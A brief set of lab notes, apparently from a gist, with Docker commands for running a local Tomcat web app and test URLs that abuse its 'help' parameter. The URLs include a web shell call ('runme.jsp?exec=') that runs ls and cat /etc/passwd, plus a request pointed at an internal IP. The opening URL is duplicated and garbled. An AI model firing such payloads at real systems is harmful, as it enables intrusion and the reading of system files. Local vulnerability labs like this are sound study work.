https://gist.github.com/hallazzang/c346e544b1c6fce8f304fdd5b2295fbhttps://gist.github.com/hallazzang/c346e544b1c6fce8f304fdd5b2295fb66

docker build -t mywebapp .
docker run --rm -it -p 127.0.0.1:8888:8080 -v $(pwd)/webapp:/usr/local/tomcat/webapps/webapp mywebapp
http://localhost:8888/webapp

http://localhost:8888/webapp/?help=runme.jsp?exec=ls
http://localhost:8888/webapp/?help=runme.jsp?exec=cat%20/etc/passwd

http://localhost:8888/webapp/?help=http://172.18.0.3:80/jsp/introduction
